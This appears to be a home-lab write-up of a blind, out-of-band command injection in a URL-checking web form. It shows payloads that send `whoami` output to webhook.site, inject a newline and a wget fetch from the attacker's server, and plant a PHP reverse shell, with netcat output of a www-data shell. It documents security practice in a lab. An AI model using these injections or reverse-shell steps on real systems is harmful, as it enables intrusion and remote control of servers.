# Command Injection - Blind | Out of Bond

- In the provided tab where I can enter the URL, I will now proceed to further investigate and explore.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/4325adcd-d5b0-42ae-95d4-b05a3990adb0)

- Upon entering the website URL, the response received is "website ok."

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/90f8e072-acf7-4142-95f2-9f23f1103625)

- After attempting a simple payload, the response received remains the same, indicating "website ok" without any discernible changes.
- When trying to navigate to a random page in the URL, the response received is "website not found."

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/fc0a5688-5b28-4a03-a17a-9e9dfe228eb9)

- When attempting to execute a simple injection command and encountering a potential command filtering mechanism, it further reinforces the indication of a blind command injection vulnerability.
- By utilizing the webhook.site URL and injecting a command, I received a response from the URL containing the username. This confirms the existence of an `Out-of-band` command injection vulnerability.
- cmd: "<IP>?`whoami`"

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/a729dabd-f96d-4fda-9a79-011505975362)

- I attempted to make a new request using the newline character. The purpose of this request was to retrieve a file from my Linux machine.
- I set up a Python server on my machine and injected the command into the URL.
- cmd: `https://<RHOST> /n wget http://<LHOST>:8080/test`

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/fdcbbf2a-6493-4b2c-8f30-acb88ad53955)

- I observe that the request has been made successfully, indicating that the command injection was successful.

```bash
└─$ python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
xxx.xxx.xx.4 - - [16/Jul/2023 04:50:29] code 404, message File not found
xxx.xxx.xx.4 - - [16/Jul/2023 04:50:29] "HEAD /test HTTP/1.1" 404 -
```
- As I see that the URL has been sanitizing signs like semicolons (;) and colons (:) so to bypass it I'll upload a PHP rev shell and then execute in order to take the rev shell back.

```bash
└─$ python -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
xxx.xxx.xx.4 - - [16/Jul/2023 05:00:04] "HEAD /phprevshell.php HTTP/1.1" 200 -
```
- On navigation from the browser to `IP/phprevshell.php` I got the revshell back to my system.

![image](https://github.com/thesinghsec/WebVulnLab-Home_Lab/assets/126919241/c3d57cf5-7c44-46e7-8838-ec96fcca02d2)

```bash
└─$ rlwrap nc -nvlp 1234 
listening on [any] 1234 ...
connect to [xxx.xxx.xxx.x86] from (UNKNOWN) [xxx.xxx.xx0.4] 52072
Linux d19181ed4936 6.3.0-kali1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.3.7-1kali1 (2023-06-29) x86_64 GNU/Linux
 04:01:55 up  5:09,  0 users,  load average: 1.83, 1.65, 1.65
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

